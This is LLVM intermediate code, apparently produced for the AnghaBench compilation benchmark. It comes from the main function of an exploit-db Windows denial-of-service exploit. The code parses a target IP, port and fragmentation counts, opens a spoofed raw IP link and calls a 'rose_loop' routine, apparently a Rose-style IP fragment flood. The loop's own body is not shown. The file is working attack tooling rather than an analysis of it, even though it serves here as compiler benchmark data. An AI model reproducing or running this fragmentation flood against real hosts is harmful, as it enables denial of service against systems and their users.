; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_24636.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_24636.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32, i32, i32, i32, i32, i32 }

@.str = private unnamed_addr constant [76 x i8] c"Usage  : %s type(1or2) ipaddress [port] [NumP] [Numt] [NumR] [NumF] [NumD]\0A\00", align 1
@.str.1 = private unnamed_addr constant [49 x i8] c"Example: %s 1 1.2.3.4 80 5 9999 99999999 1021 8\0A\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c" type      : %d=tcp, %d=udp\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c" ipaddress : address to test\0A\00", align 1
@.str.4 = private unnamed_addr constant [52 x i8] c" port      : optional port number (0 means random)\0A\00", align 1
@.str.5 = private unnamed_addr constant [44 x i8] c" NumP      : Number of packets to fragment\0A\00", align 1
@.str.6 = private unnamed_addr constant [57 x i8] c" NumT      : Number of times last fragment is rewritten\0A\00", align 1
@.str.7 = private unnamed_addr constant [42 x i8] c" NumR      : Number of times to run test\0A\00", align 1
@.str.8 = private unnamed_addr constant [45 x i8] c" NumF      : Number of fragments per packet\0A\00", align 1
@.str.9 = private unnamed_addr constant [40 x i8] c" NumD      : Delta between fragements.\0A\00", align 1
@.str.10 = private unnamed_addr constant [47 x i8] c"First parameter must be 1 or 2 (currently=%s)\0A\00", align 1
@NETWIB_IP_DECODETYPE_BEST = common dso_local global i32 0, align 4
@NETWIB_ERR_OK = common dso_local global i64 0, align 8
@.str.11 = private unnamed_addr constant [59 x i8] c"Second parameter must be an IP or hostname (currently=%s)\0A\00", align 1
@NUM_LAST = common dso_local global i32 0, align 4
@NUM_RUN = common dso_local global i32 0, align 4
@NUM_FRAG = common dso_local global i32 0, align 4
@NUM_DELTA = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [38 x i8] c"%s %d %s %d %d %d %d %d ndelta = %d\0A\0D\00", align 1
@NETWIB_FALSE = common dso_local global i32 0, align 4
@NETWIB_SPOOF_IP_INITTYPE_LINKBRAW = common dso_local global i32 0, align 4
@NETWIB_ERR_ENCODETYPE_FULL = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.TYPE_3__, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i32 (...) @netwib_init()
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 3
  br i1 %16, label %20, label %17

17:                                               ; preds = %2
  %18 = load i32, i32* %4, align 4
  %19 = icmp sgt i32 %18, 9
  br i1 %19, label %20, label %37

20:                                               ; preds = %17, %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str, i64 0, i64 0), i8* %23)
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.1, i64 0, i64 0), i8* %27)
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i32 129, i32 128)
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.4, i64 0, i64 0))
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.5, i64 0, i64 0))
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.6, i64 0, i64 0))
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.7, i64 0, i64 0))
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.8, i64 0, i64 0))
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.9, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %200

37:                                               ; preds = %17
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @atoi(i8* %40)
  %42 = ptrtoint i8* %41 to i32
  %43 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 0
  store i32 %42, i32* %43, align 4
  %44 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 0
  %45 = load i32, i32* %44, align 4
  switch i32 %45, label %47 [
    i32 129, label %46
    i32 128, label %46
  ]

46:                                               ; preds = %37, %37
  br label %52

47:                                               ; preds = %37
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.10, i64 0, i64 0), i8* %50)
  store i32 2, i32* %3, align 4
  br label %200

52:                                               ; preds = %46
  %53 = load i8**, i8*** %5, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 2
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @netwib_buf_init_ext_text(i8* %55, i32* %7)
  %57 = call i32 @netwib_er(i32 %56)
  %58 = load i32, i32* @NETWIB_IP_DECODETYPE_BEST, align 4
  %59 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 5
  %60 = call i64 @netwib_ip_init_buf(i32* %7, i32 %58, i32* %59)
  store i64 %60, i64* %8, align 8
  %61 = load i64, i64* %8, align 8
  %62 = load i64, i64* @NETWIB_ERR_OK, align 8
  %63 = icmp ne i64 %61, %62
  br i1 %63, label %64, label %69

64:                                               ; preds = %52
  %65 = load i8**, i8*** %5, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 2
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.11, i64 0, i64 0), i8* %67)
  store i32 3, i32* %3, align 4
  br label %200

69:                                               ; preds = %52
  %70 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 1
  store i32 0, i32* %70, align 4
  %71 = load i32, i32* %4, align 4
  %72 = icmp sgt i32 %71, 3
  br i1 %72, label %73, label %80

73:                                               ; preds = %69
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 3
  %76 = load i8*, i8** %75, align 8
  %77 = call i8* @atoi(i8* %76)
  %78 = ptrtoint i8* %77 to i32
  %79 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 1
  store i32 %78, i32* %79, align 4
  br label %80

80:                                               ; preds = %73, %69
  store i32 5, i32* %9, align 4
  %81 = load i32, i32* %4, align 4
  %82 = icmp sgt i32 %81, 4
  br i1 %82, label %83, label %89

83:                                               ; preds = %80
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 4
  %86 = load i8*, i8** %85, align 8
  %87 = call i8* @atoi(i8* %86)
  %88 = ptrtoint i8* %87 to i32
  store i32 %88, i32* %9, align 4
  br label %89

89:                                               ; preds = %83, %80
  %90 = load i32, i32* %9, align 4
  %91 = icmp slt i32 %90, 1
  br i1 %91, label %92, label %93

92:                                               ; preds = %89
  store i32 1, i32* %9, align 4
  br label %93

93:                                               ; preds = %92, %89
  %94 = load i32, i32* %9, align 4
  %95 = icmp sgt i32 %94, 1000
  br i1 %95, label %96, label %97

96:                                               ; preds = %93
  store i32 1000, i32* %9, align 4
  br label %97

97:                                               ; preds = %96, %93
  %98 = load i32, i32* @NUM_LAST, align 4
  store i32 %98, i32* %10, align 4
  %99 = load i32, i32* %4, align 4
  %100 = icmp sgt i32 %99, 5
  br i1 %100, label %101, label %107

101:                                              ; preds = %97
  %102 = load i8**, i8*** %5, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 5
  %104 = load i8*, i8** %103, align 8
  %105 = call i8* @atoi(i8* %104)
  %106 = ptrtoint i8* %105 to i32
  store i32 %106, i32* %10, align 4
  br label %107

107:                                              ; preds = %101, %97
  %108 = load i32, i32* @NUM_RUN, align 4
  store i32 %108, i32* %11, align 4
  %109 = load i32, i32* %4, align 4
  %110 = icmp sgt i32 %109, 6
  br i1 %110, label %111, label %117

111:                                              ; preds = %107
  %112 = load i8**, i8*** %5, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 6
  %114 = load i8*, i8** %113, align 8
  %115 = call i8* @atoi(i8* %114)
  %116 = ptrtoint i8* %115 to i32
  store i32 %116, i32* %11, align 4
  br label %117

117:                                              ; preds = %111, %107
  %118 = load i32, i32* @NUM_FRAG, align 4
  store i32 %118, i32* %12, align 4
  %119 = load i32, i32* %4, align 4
  %120 = icmp sgt i32 %119, 7
  br i1 %120, label %121, label %127

121:                                              ; preds = %117
  %122 = load i8**, i8*** %5, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 7
  %124 = load i8*, i8** %123, align 8
  %125 = call i8* @atoi(i8* %124)
  %126 = ptrtoint i8* %125 to i32
  store i32 %126, i32* %12, align 4
  br label %127

127:                                              ; preds = %121, %117
  %128 = load i32, i32* %12, align 4
  %129 = icmp slt i32 %128, 1
  br i1 %129, label %130, label %131

130:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %131

131:                                              ; preds = %130, %127
  %132 = load i32, i32* @NUM_DELTA, align 4
  store i32 %132, i32* %13, align 4
  %133 = load i32, i32* %4, align 4
  %134 = icmp sgt i32 %133, 8
  br i1 %134, label %135, label %141

135:                                              ; preds = %131
  %136 = load i8**, i8*** %5, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 8
  %138 = load i8*, i8** %137, align 8
  %139 = call i8* @atoi(i8* %138)
  %140 = ptrtoint i8* %139 to i32
  store i32 %140, i32* %13, align 4
  br label %141

141:                                              ; preds = %135, %131
  %142 = load i32, i32* %12, align 4
  %143 = load i32, i32* %13, align 4
  %144 = mul nsw i32 %142, %143
  %145 = add nsw i32 %144, 8
  store i32 %145, i32* %12, align 4
  %146 = load i32, i32* %12, align 4
  %147 = icmp sgt i32 %146, 8170
  br i1 %147, label %148, label %149

148:                                              ; preds = %141
  store i32 8170, i32* %12, align 4
  br label %149

149:                                              ; preds = %148, %141
  %150 = load i8**, i8*** %5, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 0
  %152 = load i8*, i8** %151, align 8
  %153 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = load i8**, i8*** %5, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 2
  %157 = load i8*, i8** %156, align 8
  %158 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 1
  %159 = load i32, i32* %158, align 4
  %160 = load i32, i32* %9, align 4
  %161 = load i32, i32* %10, align 4
  %162 = load i32, i32* %11, align 4
  %163 = load i32, i32* %12, align 4
  %164 = sdiv i32 %163, 8
  %165 = load i32, i32* %13, align 4
  %166 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.12, i64 0, i64 0), i8* %152, i32 %154, i8* %157, i32 %159, i32 %160, i32 %161, i32 %162, i32 %164, i32 %165)
  %167 = load i32, i32* @NETWIB_FALSE, align 4
  %168 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 4
  store i32 %167, i32* %168, align 4
  %169 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 2
  %170 = call i32 @netwib_buf_init_mallocdefault(i32* %169)
  %171 = call i32 @netwib_er(i32 %170)
  %172 = load i32, i32* @NETWIB_SPOOF_IP_INITTYPE_LINKBRAW, align 4
  %173 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 3
  %174 = call i32 @netwib_io_init_spoof_ip(i32 %172, i32* %173)
  %175 = call i32 @netwib_er(i32 %174)
  %176 = load i32, i32* %9, align 4
  %177 = load i32, i32* %10, align 4
  %178 = load i32, i32* %11, align 4
  %179 = load i32, i32* %12, align 4
  %180 = load i32, i32* %13, align 4
  %181 = call i64 @rose_loop(%struct.TYPE_3__* %6, i32 %176, i32 %177, i32 %178, i32 %179, i32 %180)
  store i64 %181, i64* %8, align 8
  %182 = load i64, i64* %8, align 8
  %183 = load i64, i64* @NETWIB_ERR_OK, align 8
  %184 = icmp ne i64 %182, %183
  br i1 %184, label %185, label %192

185:                                              ; preds = %149
  %186 = load i64, i64* %8, align 8
  %187 = load i32, i32* @NETWIB_ERR_ENCODETYPE_FULL, align 4
  %188 = call i32 @netwib_err_display(i64 %186, i32 %187)
  %189 = call i32 @netwib_er(i32 %188)
  %190 = load i64, i64* %8, align 8
  %191 = trunc i64 %190 to i32
  store i32 %191, i32* %3, align 4
  br label %200

192:                                              ; preds = %149
  %193 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 3
  %194 = call i32 @netwib_io_close(i32* %193)
  %195 = call i32 @netwib_er(i32 %194)
  %196 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %6, i32 0, i32 2
  %197 = call i32 @netwib_buf_close(i32* %196)
  %198 = call i32 @netwib_er(i32 %197)
  %199 = call i32 (...) @netwib_close()
  store i32 0, i32* %3, align 4
  br label %200

200:                                              ; preds = %192, %185, %64, %47, %20
  %201 = load i32, i32* %3, align 4
  ret i32 %201
}

declare dso_local i32 @netwib_init(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @atoi(i8*) #1

declare dso_local i32 @netwib_er(i32) #1

declare dso_local i32 @netwib_buf_init_ext_text(i8*, i32*) #1

declare dso_local i64 @netwib_ip_init_buf(i32*, i32, i32*) #1

declare dso_local i32 @netwib_buf_init_mallocdefault(i32*) #1

declare dso_local i32 @netwib_io_init_spoof_ip(i32, i32*) #1

declare dso_local i64 @rose_loop(%struct.TYPE_3__*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @netwib_err_display(i64, i32) #1

declare dso_local i32 @netwib_io_close(i32*) #1

declare dso_local i32 @netwib_buf_close(i32*) #1

declare dso_local i32 @netwib_close(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
